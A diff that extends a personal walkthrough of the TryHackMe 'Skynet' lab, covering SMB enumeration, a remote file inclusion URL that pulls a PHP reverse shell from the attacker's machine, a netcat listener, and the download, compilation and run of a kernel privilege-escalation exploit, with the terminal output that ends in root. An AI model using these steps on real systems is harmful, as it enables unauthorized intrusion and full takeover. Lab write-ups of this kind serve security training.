@@ -51,6 +51,17 @@ current possible directory with gobuster
 seems like we are really going down the rabbit hole, let's go back to what we have seen from the nmap result.
 we could see that imap and pop3 ports are open.
 
+ENUMERATE SMB
+Anonymous IPC Access via SMB
+With an anonymous null session you can access the IPC$ share and interact with services exposed via named pipes. The enum4linux utility within Kali Linux is particularly useful; with it, you can obtain the following:
+• Operating system information
+• Details of the parent domain
+• A list of local users and groups
+• Details of available SMB shares
+• The effective system security policy
+
+enum4linux ip 
+
 taking some reference from google
 IMAP and POP3 are the two most commonly used Internet mail protocols for retrieving emails. Both protocols are supported by all modern email clients and web servers. While the POP3 protocol assumes that your email is being accessed only from one application, IMAP allows simultaneous access by multiple clients.
 
@@ -174,7 +185,85 @@ LINE 22:
     
 seems like we must do a php code injection, so let's use php reverse shell
 lets get this
-kali@kali:~/oscptraining/tryhackme/Skynet$ wget https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+download php reverse shell from pentest monkey, edit the config
+according to the documentation
+1. set up simple http
+2. nc -lvnp port
+3. place the following url
+
+http://10.10.223.79/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.8.102.117/php-reverse-shell.php
+
+4. catch the shell 
+
+get the user.txt
+
+Privilege Escalation
+
+check version   >> uname -a
+find exploit 
+get exploit file to target after setting up webserver
+
+www-data@skynet:/tmp$ wget 10.8.102.117:80/43418.c
+wget 10.8.102.117:80/43418.c
+--2021-05-02 05:11:32--  http://10.8.102.117/43418.c
+Connecting to 10.8.102.117:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 24033 (23K) [text/x-csrc]
+Saving to: '43418.c'
+
+43418.c             100%[===================>]  23.47K  90.6KB/s    in 0.3s    
+
+2021-05-02 05:11:33 (90.6 KB/s) - '43418.c' saved [24033/24033]
+
+www-data@skynet:/tmp$ ls
+ls
+43418.c
+systemd-private-5f8beb6b2d9448a7a43dca19e2677502-dovecot.service-ihszxh
+systemd-private-5f8beb6b2d9448a7a43dca19e2677502-systemd-timesyncd.service-Bm3wiD
+www-data@skynet:/tmp$ gcc 43418.c -o exploit
+gcc 43418.c -o exploit
+www-data@skynet:/tmp$ ls
+ls
+43418.c
+exploit
+systemd-private-5f8beb6b2d9448a7a43dca19e2677502-dovecot.service-ihszxh
+systemd-private-5f8beb6b2d9448a7a43dca19e2677502-systemd-timesyncd.service-Bm3wiD
+www-data@skynet:/tmp$ chmod +x exploit
+chmod +x exploit
+www-data@skynet:/tmp$ ./exploit
+./exploit
+[.] starting
+[.] checking distro and kernel versions
+[.] kernel version '4.8.0-58-generic' detected
+[~] done, versions looks good
+[.] checking SMEP and SMAP
+[~] done, looks good
+[.] setting up namespace sandbox
+[~] done, namespace sandbox set up
+[.] KASLR bypass enabled, getting kernel addr
+[~] done, kernel text:   ffffffff82400000
+[.] commit_creds:        ffffffff824a5d20
+[.] prepare_kernel_cred: ffffffff824a6110
+[.] SMEP bypass enabled, mmapping fake stack
+[~] done, fake stack mmapped
+[.] executing payload ffffffff82417c55
+[~] done, should be root now
+[.] checking if we got root
+[+] got r00t ^_^
+root@skynet:/tmp# ls
+ls
+43418.c
+exploit
+systemd-private-5f8beb6b2d9448a7a43dca19e2677502-dovecot.service-ihszxh
+systemd-private-5f8beb6b2d9448a7a43dca19e2677502-systemd-timesyncd.service-Bm3wiD
+root@skynet:/tmp# cat /root/root.txt
+cat /root/root.txt
+3f0372db24753accc7179a282cd6a949
+
+
+completed 2nd may 2021 1814hr
+
+
 
 
 
